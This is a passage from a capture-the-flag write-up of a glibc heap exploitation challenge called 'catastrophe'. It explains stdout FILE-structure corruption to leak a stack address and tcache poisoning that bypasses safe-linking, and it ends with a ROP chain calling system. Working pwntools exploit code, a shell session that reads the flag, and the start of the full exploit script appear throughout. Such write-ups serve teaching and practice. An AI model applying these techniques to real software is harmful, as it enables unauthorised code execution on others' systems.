  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;if&lt;/span&gt; (fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_end &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_base)
    {
      off64_t new_pos
	&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; _IO_SYSSEEK (fp, fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_base &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_end, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (new_pos &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; _IO_pos_BAD)
	    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
      fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; new_pos;
    }
  count &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; _IO_SYSWRITE (fp, data, to_do);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_cur_column &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; count)
    fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_cur_column &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; _IO_adjust_column (fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_cur_column &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, data, count) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
  _IO_setg (fp, fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_base, fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_base, fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_base);
  fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_base;
  fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_mode &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
		       &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_flags &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; (_IO_LINE_BUF &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; _IO_UNBUFFERED))
		       &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_base : fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_end);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; count;
}

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To avoid the &lt;code&gt;_IO_SYSSEEK&lt;/code&gt; which could break stdout, we can add &lt;code&gt;_IO_IS_APPENDING&lt;/code&gt; to &lt;code&gt;fp-&amp;gt;_flags&lt;/code&gt;. Then &lt;code&gt;_IO_SYSWRITE&lt;/code&gt; is called and prints &lt;code&gt;(_f)-&amp;gt;_IO_write_ptr-(_f)-&amp;gt;_IO_write_base&lt;/code&gt; bytes from &lt;code&gt;(_f)-&amp;gt;_IO_write_base&lt;/code&gt; to stdout. But that&amp;rsquo;s not finished, right after we got the stack leak &lt;code&gt;new_do_write&lt;/code&gt; initializes the output / input buffer to &lt;code&gt;_IO_buf_base&lt;/code&gt; except for the output buffer which is initialized to &lt;code&gt;_IO_buf_end&lt;/code&gt; (&lt;code&gt;_IO_LINE_BUF&lt;/code&gt; not present). Thus we have to make &lt;code&gt;fp-&amp;gt;_IO_buf_base&lt;/code&gt; and &lt;code&gt;fp-&amp;gt;_IO_buf_end&lt;/code&gt; equal to valid writable pointers.&lt;/p&gt;
&lt;p&gt;Thus we just need to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;fp-&amp;gt;_flags&lt;/code&gt; = (&lt;code&gt;fp-&amp;gt;_flags&lt;/code&gt; &amp;amp; ~(&lt;code&gt;_IO_NO_WRITES&lt;/code&gt;)) | &lt;code&gt;_IO_CURRENTLY_PUTTING&lt;/code&gt; | &lt;code&gt;_IO_IS_APPENDING&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;f-&amp;gt;_IO_write_ptr&lt;/code&gt; = &lt;code&gt;fp-&amp;gt;_IO_write_end&lt;/code&gt; = &lt;code&gt;f-&amp;gt;_IO_buf_end&lt;/code&gt; = &lt;code&gt;&amp;amp;environ + 8&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;fp-&amp;gt;_IO_write_base&lt;/code&gt; = &lt;code&gt;&amp;amp;environ&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Which gives:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;
alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, 
    pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xfbad1800&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# _flags&lt;/span&gt;
    pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(environ)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# _IO_read_*&lt;/span&gt;
    pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(environ) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# _IO_write_base&lt;/span&gt;
    pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(environ &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# _IO_write_ptr + _IO_write_end&lt;/span&gt;
    pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(environ &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# _IO_buf_base&lt;/span&gt;
    pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(environ &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# _IO_buf_end&lt;/span&gt;
    , &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;) 

stack &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;u64(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x130&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; 
&lt;span style=&#34;color:#75715e&#34;&gt;# Offset of the saved rip that belongs to frame of the op_malloc function&lt;/span&gt;
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stack: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(stack)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;ropchain&#34;&gt;ROPchain&lt;/h2&gt;
&lt;p&gt;Now we leaked the stack address we finally just need to achieve another arbitrary write to craft the ROPchain onto the &lt;code&gt;op_malloc&lt;/code&gt; function that writes the user input into the requested chunk.&lt;/p&gt;
&lt;p&gt;To get the arbitrary write we just have to use the same overlapping chunks technique than last time, let&amp;rsquo;s say we wanna write to &lt;code&gt;target&lt;/code&gt; and we have &lt;code&gt;prev&lt;/code&gt; that overlaps &lt;code&gt;victim&lt;/code&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;free(prev)&lt;/code&gt; ends up in the tcachebin (0x140), it has already been consolidated, it &lt;em&gt;already&lt;/em&gt; overlaps &lt;code&gt;victim&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;free(victim)&lt;/code&gt; ends up in the tcachebin (0x110).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;malloc(0x130)&lt;/code&gt; returns &lt;code&gt;prev&lt;/code&gt;, thus we can corrupt &lt;code&gt;victim-&amp;gt;next&lt;/code&gt; and intialize it to &lt;code&gt;(target ^ ((chunk_location) &amp;gt;&amp;gt; 12)&lt;/code&gt; to bypass safe-linking.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;malloc(0x100)&lt;/code&gt; returns &lt;code&gt;victim&lt;/code&gt; and tcachebin (0x110) next free chunk is &lt;code&gt;target&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;malloc(0x100)&lt;/code&gt; gives a write what where.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;When we got the write what where on the stack we simply have to craft a call ot system since there is no &lt;code&gt;seccomp&lt;/code&gt; shit.
Here is the script:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;free(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# prev&lt;/span&gt;
free(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# victim&lt;/span&gt;

alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;T&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x108&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x111&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64((stack &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ((heap &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xb20&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;))), &lt;span style=&#34;color:#ae81ff&#34;&gt;0x130&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# victim-&amp;gt;next = target&lt;/span&gt;
alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;TT&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;)

alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(stack) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;chain(), &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# overwrite sRBP for nothing lmao&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# ROPchain on do_malloc&amp;#39;s stackframe&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And here we are:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nasm@off:~/Documents/pwn/diceCTF/catastrophe/f2$ python3 sexploit.py REMOTE HOST&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;mc.ax PORT&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;31273&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/nasm/Documents/pwn/diceCTF/catastrophe/f2/catastrophe&amp;#39;&lt;/span&gt;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Opening connection to mc.ax on port 31273: Done
/home/nasm/.local/lib/python3.10/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self.recvuntil&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;delim, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;timeout&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; heap @ 0x559cb0184000
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; libc: 0x7efe8a967000
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; environ: 0x7efe8ab88200
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; stdout: 0x7efe8ab81780
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; stack: 0x7ffe06420710
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Switching to interactive mode
$ id
uid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt; gid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt; groups&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;
$ ls
flag.txt
run
$ cat flag.txt
hope&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;apparently_not_good_enough_33981d897c3b0f696e32d3c67ad4ed1e&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;resources&#34;&gt;Resources&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://a1ex.online/2020/10/01/glibc-IO%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/&#34;&gt;a1ex.online&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write&#34;&gt;ray-cp&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://blog.leanote.com/post/mut3p1g/file-struct&#34;&gt;Mutepig&amp;rsquo;s Blog&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;appendices&#34;&gt;Appendices&lt;/h2&gt;
&lt;p&gt;Final exploit:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# this exploit was generated via&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 1) pwntools&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 2) ctfmate&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; time
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pwn


&lt;span style=&#34;color:#75715e&#34;&gt;# Set up pwntools for the correct architecture&lt;/span&gt;
exe &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;catastrophe&amp;#39;&lt;/span&gt;)
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;delete_corefiles &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rename_corefiles &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;timeout &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2000&lt;/span&gt;

host &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;HOST &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;
port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;PORT &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;)


&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;local&lt;/span&gt;(argv&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[], &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kw):
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;Execute the target binary locally&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GDB:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;debug([exe&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; argv, gdbscript&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;gdbscript, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kw)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;process([exe&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; argv, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kw)


&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;remote&lt;/span&gt;(argv&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[], &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kw):
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;Connect to the process on the remote host&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
    io &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect(host, port)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GDB:
        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;attach(io, gdbscript&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;gdbscript)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; io


&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;start&lt;/span&gt;(argv&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[], &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kw):
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;Start the exploit against the target.&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;LOCAL:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; local(argv, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kw)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; remote(argv, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kw)


gdbscript &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b* main
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;source ~/Downloads/pwndbg/gdbinit.py
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;continue
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;locals())

io &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;

libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;libc.so.6&amp;#34;&lt;/span&gt;)

